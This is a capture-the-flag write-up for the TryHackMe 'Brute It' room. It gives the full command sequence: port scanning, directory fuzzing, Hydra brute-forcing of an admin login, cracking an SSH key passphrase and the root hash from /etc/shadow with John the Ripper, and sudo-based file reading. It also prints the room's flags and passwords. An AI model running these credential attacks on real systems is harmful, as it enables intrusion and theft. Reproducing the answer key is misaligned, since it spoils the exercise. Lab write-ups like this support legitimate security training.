# [Brute It](https://tryhackme.com/room/bruteit)| TryHackMe Write-up

# Task 1 — Reconnaissance

## 1. Scanning Open Ports with Nmap

Command used:

```bash
nmap -sS -sV -p- MACHINE_IP
```

### Command Explanation:

* `-sS` : SYN scan (fast and stealthy)
* `-sV` : Service version detection
* `-p-` : Scan all 65,535 TCP ports



## Results Obtained:

* **Open ports**: `2`
* **SSH**: `OpenSSH 7.6p1`
* **Web Server**: `Apache 2.4.29`
* **Operating System**: `Ubuntu Linux`



## 2. Hidden Directory Discovery (Fuzzing)

Command used:

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://MACHINE_IP
```

### Explanation:

* `gobuster dir` : Directory enumeration mode
* `-w` : Path to the wordlist (`common.txt`)
* `-u` : Target URL



## Discovered Hidden Directory:

* `/admin`

This directory is potentially sensitive and often associated with a login panel or management interface.



## Summary of Answers:

| Question                             | Answer          |
|  |  |
| How many ports are open?             | `2`             |
| What version of SSH is running?      | `OpenSSH 7.6p1` |
| What version of Apache is running?   | `2.4.29`        |
| Which Linux distribution is running? | `Ubuntu`        |
| What is the hidden directory?        | `/admin`        |



# Task 2 — Getting a Shell

## Step 1: Finding the Admin Panel Credentials

* On the `/admin` page, press **Ctrl+U** to view the page source.
* A note is found:

> "hey john if you don’t remember username is admin"

This confirms that the username is `admin`.



## Step 2: Brute-Forcing the Admin Password with Hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "http://machine_ip/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
```

Result:

* Password successfully found
* **Web flag**: `THM{brut3_f0rce_is_e4sy}`



## Step 3: Finding and Cracking the SSH Key

* After logging in, an SSH private key is retrieved from the system.
* Copy the private key into a local file named `id_rsa`:

```bash
nano id_rsa
# Paste the private key
chmod 600 id_rsa
```

* Convert the SSH key for John the Ripper:

```bash
/opt/john/ssh2john.py id_rsa > forjohn.txt
john --wordlist=/usr/share/wordlists/rockyou.txt forjohn.txt
```

* **RSA private key passphrase found**: `rockinroll`



## Step 4: SSH Login Using the Private Key

* Attempt SSH login with user `admin` (connection closes immediately).
* Attempt with user `john`:

```bash
ssh -i id_rsa john@machine_ip
```

* Successful login



## Step 5: Retrieving the User Flag

```bash
cat /home/john/user.txt
```

* **User flag**: `THM{a_password_is_not_a_barrier}`



# Task 3 — Privilege Escalation

## Step 1: Checking Sudo Privileges

```bash
sudo -l
```

It is discovered that user `john` can execute `/bin/cat` as `root` without a password:

```
(root) NOPASSWD: /bin/cat
```



## Step 2: Reading the Root Flag

```bash
cd /
sudo cat /root/root.txt
```

**Root flag:**

```
THM{pr1v1l3g3_3sc4l4t10n}
```



## Step 3: Retrieving the Root Password

Using `sudo cat`, read the `/etc/shadow` file:

```bash
LFILE=/etc/shadow
sudo cat $LFILE | grep "root"
```

Obtained hash:

```
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```



## Step 4: Cracking the Password with John

On the AttackBox:

1. Create a file containing the hash:

```bash
nano password.txt
```

(Paste the hash inside the file)

2. Run John the Ripper:

```bash
john password.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

3. Display the cracked password:

```bash
john --show password.txt
```

**Root password:**

```
football
```



## Final Summary

* **Root password**: `football`
* **Root flag**: `THM{pr1v1l3g3_3sc4l4t10n}`
